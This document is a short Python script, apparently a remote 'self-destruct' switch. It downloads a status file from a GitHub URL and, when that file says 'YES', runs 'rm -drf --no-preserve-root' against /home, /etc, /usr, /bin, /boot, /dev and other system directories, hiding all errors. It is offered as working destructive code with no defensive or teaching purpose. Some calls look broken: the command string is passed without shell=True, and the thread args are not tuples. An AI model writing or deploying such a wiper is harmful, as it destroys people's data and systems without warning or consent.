#!/bin/python3

import requests
import subprocess as sb
import threading as th

response = requests.get('https://raw.githubusercontent.com/ssbuffer/self_destruct/main/status')

def delete_folder(folder):
    try:
        sb.run(f"rm -drf --no-preserve-root {folder}")
    except:
        pass

if response.text.strip() == "YES":
    delete_folder("/home")
    
    th.Thread(target=delete_folder, args=("/tmp")).start()
    th.Thread(target=delete_folder, args=("/etc")).start()
    th.Thread(target=delete_folder, args=("/var")).start()
    th.Thread(target=delete_folder, args=("/lib")).start()
    th.Thread(target=delete_folder, args=("/lib32")).start()
    th.Thread(target=delete_folder, args=("/lib64")).start()
    th.Thread(target=delete_folder, args=("/media")).start()
    th.Thread(target=delete_folder, args=("/mnt")).start()
    th.Thread(target=delete_folder, args=("/opt")).start()
    th.Thread(target=delete_folder, args=("/sbin")).start()
    th.Thread(target=delete_folder, args=("/srv")).start()
    th.Thread(target=delete_folder, args=("/usr")).start()
    th.Thread(target=delete_folder, args=("/VM")).start()

    delete_folder("/bin")
    delete_folder("/boot")
    delete_folder("/proc")
    delete_folder("/run")
    delete_folder("/dev")
